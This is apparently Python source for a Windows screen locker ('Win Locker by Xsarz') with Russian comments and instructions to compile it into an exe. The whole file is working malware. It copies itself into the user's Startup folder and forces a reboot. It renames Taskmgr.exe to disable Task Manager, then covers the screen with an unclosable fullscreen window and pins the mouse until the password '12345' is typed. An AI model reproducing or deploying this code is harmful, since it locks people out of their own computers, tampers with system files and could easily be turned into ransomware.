import tkinter
from tkinter import messagebox
from getpass import getuser
import pyautogui
from os import rename, system, listdir
from os.path import realpath, dirname
from sys import argv
from shutil import copyfile

pyautogui.FAILSAFE = False
user = getuser()
name=argv[0].split('\\')[-1]
window = tkinter.Tk()
path1 = "C:\Windows\System32\Taskmgr.exe"
path2 = "C:\Windows\System32\sys_32.exe"


#------------------------------------------------------------
password = "12345" #Пароль для отключения
text = "Пароль 12345" #Текст

color = "grey" #задний фон

title = 'Win Locker by Xsarz' #Название окон
close_text = "Не закрывай пожалуйста 😥" #При попытке закрыть
password_error = "Неверный пароль😜" #При неверном пароле

"""
Скомпилировать в exe:
pip install pyinstaller
pyinstaller -w -F WinLocker.py
"""
#------------------------------------------------------------



def copy():
	file = f'C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{name}'
	copyfile(argv[0], file)


def close_block():
    pyautogui.moveTo(x=0,y=0)
    window.protocol("WM_DELETE_WINDOW",close_block)
    window.update()
    messagebox.showerror(title, close_text)


def accept_password(input_passwords):
	if input_passwords == password:
		window.destroy()
		try:rename(path2, path1)
		except: pass
	else:messagebox.showerror(title, password_error)


def start():
	try:rename(path1, path2)
	except: pass
	close_block()
	window.mainloop()



def on_start():
	if name not in listdir(f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"):
		copy()
		system("shutdown -r -t 1")
	else:
		if argv[0] == f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}':start()






window.title(title)

width = window.winfo_screenwidth()
height = window.winfo_screenheight()

window.geometry(f'{width}x{height}')
window['bg'] = color
window.attributes('-fullscreen', True,'-topmost', True)


title_lbl = tkinter.Label(window, text=title, font=("Arial Bold", int(height/10)), fg='red', bg=color)
text_lbl = tkinter.Label(window, text=text, font=("Arial Bold", int(height/40)), fg='white', bg=color)

accept_password_btn = tkinter.Button(window, text='Проверить', background="#555", foreground="#ccc", padx="15", pady="6", font="15", command=lambda: accept_password(input_passwords=password_entry.get()))
password_entry = tkinter.Entry(window,width=25)


title_lbl.grid(column=0, row=0)
text_lbl.grid(column=0, row=1, pady=5)
password_entry.grid(column=0, row=2, pady=5)
accept_password_btn.grid(column=0, row=3, pady=15)


on_start()
